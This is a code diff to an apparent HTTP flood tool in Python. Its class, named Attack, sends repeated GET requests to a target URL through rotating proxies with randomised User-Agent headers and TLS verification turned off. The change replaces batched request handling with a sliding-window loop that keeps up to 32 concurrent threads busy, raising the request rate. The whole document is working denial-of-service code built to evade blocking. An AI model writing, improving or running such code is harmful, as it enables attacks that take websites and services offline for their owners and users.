@@ -37,7 +37,7 @@ import requests
 import urllib3
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -248,13 +248,10 @@ class Attack:
 
         if self.mode == "soft":
             workers = 1
-            batch_target = 1
         elif self.mode == "burst":
             workers = 16
-            batch_target = 32
         else:
             workers = 32
-            batch_target = 64
 
         retry = Retry(total=1, connect=1, read=1, redirect=1, backoff_factor=0.1, status_forcelist=[])
         adapter = HTTPAdapter(
@@ -272,15 +269,14 @@ class Attack:
             session.get(self.url, headers=headers, proxies=proxy, timeout=5, verify=False)
 
         try:
-            futures = []
             total = self.num_requests * (1 if self.mode == "burst" else 5)
-            for _ in range(total):
-                if not self.running:
-                    break
-                headers = {"User-Agent": random.choice(USER_AGENTS)}
-                proxy = self._pick_proxy()
 
-                if self.mode == "soft":
+            if self.mode == "soft":
+                for _ in range(total):
+                    if not self.running:
+                        break
+                    headers = {"User-Agent": random.choice(USER_AGENTS)}
+                    proxy = self._pick_proxy()
                     try:
                         send(headers, proxy)
                         with self.lock:
@@ -292,38 +288,46 @@ class Attack:
                     except Exception:
                         with self.lock:
                             self.errors += 1
-                    continue
-
-                futures.append(executor.submit(send, headers, proxy))
-                if len(futures) >= batch_target:
-                    for fut in as_completed(futures):
-                        try:
-                            fut.result()
-                        except requests.exceptions.RequestException:
-                            with self.lock:
-                                self.errors += 1
-                        except Exception:
-                            with self.lock:
-                                self.errors += 1
-                        finally:
-                            with self.lock:
-                                self.sent += 1
-                                show_progress(self.sent, self.num_requests)
-                    futures = []
-
-            for fut in as_completed(futures):
-                try:
-                    fut.result()
-                except requests.exceptions.RequestException:
-                    with self.lock:
-                        self.errors += 1
-                except Exception:
-                    with self.lock:
-                        self.errors += 1
-                finally:
-                    with self.lock:
-                        self.sent += 1
-                        show_progress(self.sent, self.num_requests)
+                print("\n")
+            else:
+                window = workers
+                pending = set()
+                submitted = 0
+                while submitted < total and self.running:
+                    while len(pending) < window and submitted < total and self.running:
+                        headers = {"User-Agent": random.choice(USER_AGENTS)}
+                        proxy = self._pick_proxy()
+                        pending.add(executor.submit(send, headers, proxy))
+                        submitted += 1
+                    if self.running and pending:
+                        done, pending = wait(pending, return_when=FIRST_COMPLETED)
+                        for fut in done:
+                            try:
+                                fut.result()
+                            except requests.exceptions.RequestException:
+                                with self.lock:
+                                    self.errors += 1
+                            except Exception:
+                                with self.lock:
+                                    self.errors += 1
+                            finally:
+                                with self.lock:
+                                    self.sent += 1
+                                    show_progress(self.sent, self.num_requests)
+                for fut in list(pending):
+                    try:
+                        fut.result()
+                    except requests.exceptions.RequestException:
+                        with self.lock:
+                            self.errors += 1
+                    except Exception:
+                        with self.lock:
+                            self.errors += 1
+                    finally:
+                        with self.lock:
+                            self.sent += 1
+                            show_progress(self.sent, self.num_requests)
+                print("\n")
         finally:
             executor.shutdown(wait=False)
             session.close()
